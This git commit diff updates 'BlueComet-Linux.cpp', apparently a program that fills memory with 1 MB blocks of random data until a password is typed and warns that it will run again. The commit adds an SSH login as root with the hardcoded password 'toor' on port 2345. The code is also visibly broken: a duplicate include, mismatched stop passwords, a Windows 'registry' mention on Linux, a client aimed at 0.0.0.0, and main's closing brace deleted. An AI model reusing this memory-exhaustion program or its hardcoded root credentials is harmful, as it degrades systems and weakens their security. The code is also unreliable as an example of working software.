4b3ef17005fc7dcf9a30e8690afee7fc16bfa6c3
Nathaniel Madore <natemadore@gmail.com>
2023-03-06 22:52:33 -0500

    Update BlueComet-Linux.cpp
    Adds connection via SSH to port 2345 under username root and password toor.

--- BlueComet-Linux.cpp
+++ BlueComet-Linux.cpp
@@ -14,13 +14,47 @@ BlueComet for Linux
 
 
 #include <iostream>
-#include <string>
+#include <string>    
+#include <cstring>
+#include <libssh/libssh.h>
 #include <cstring>
 #include <cstdlib>
 
-using namespace std; /*Used to display counter and password simultaneously*/
+using namespace std;
 
-int main() {
+int main()
+
+{
+	/* Allow SSH Connections on any network. */
+    const char* host = "0.0.0.0"; 
+    int port = 2345;
+
+    ssh_session session = ssh_new();
+    if (session == NULL) {
+        cerr << "Error creating SSH session" << endl;
+        return 1;
+    }
+
+    ssh_options_set(session, SSH_OPTIONS_HOST, host);
+    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
+    ssh_options_set(session, SSH_OPTIONS_USER, "root"); // replace with your admin username
+    ssh_options_set(session, SSH_OPTIONS_CIPHERS_C_S, "aes256-cbc"); 
+
+    int rc = ssh_connect(session);
+    if (rc != SSH_OK) {
+        cerr << "Error connecting to SSH server: " << ssh_get_error(session) << endl;
+        ssh_free(session);
+        return 1;
+    }
+
+    rc = ssh_userauth_password(session, NULL, "toor"); // replace with your admin password
+    if (rc != SSH_AUTH_SUCCESS) {
+        cerr << "Error authenticating with SSH server: " << ssh_get_error(session) << endl;
+        ssh_disconnect(session);
+        ssh_free(session);
+        return 1;
+    }
+
     /* Password to stop memory crash is P@thf1nder */
     const char password[] = {'P', '@', 't', 'h', 'f', '1', 'n', 'd', 'e', 'r', '\0'};
     char input[11];
@@ -32,21 +66,15 @@ int main() {
             char* buffer = new char[1024 * 1024]; // allocate 1 MB of memory
             memset(buffer, rand() % 256, 1024 * 1024); // fill with random binary
         }
-        
-        /*Pull Current Memory Status*/
-        long pages = sysconf(_SC_PHYS_PAGES);
-        long page_size = sysconf(_SC_PAGE_SIZE);
-        long ram_size = pages * page_size;
-        cout << "Dumping 1MB Binary to Memory " << loopCount << " iterations completed. " << ram_size / (1024 * 1024) << " MB of memory remaining." << endl;
+
+        cout << "Dumping 1MB Binary to Memory " << loopCount << " iterations completed." << endl;
         loopCount++;
-        
-        /*Enter Password: Pathf1nder to stop*/
+    /*Enter Password: Pathf1nder to stop. Remove BlueComet from registry to remove program.*/
         cout << "Enter password P@thF1nder to stop the program: ";
         cin >> input;
         if (strcmp(input, password) == 0) {
-            cout << "Password correct. Stopping program." << endl;
+            cout << "Password correct. Stopping program. Remove BlueComet from memory or this will happen again." << endl;
             stopProgram = true;
         }
     }
     return 0;
-}
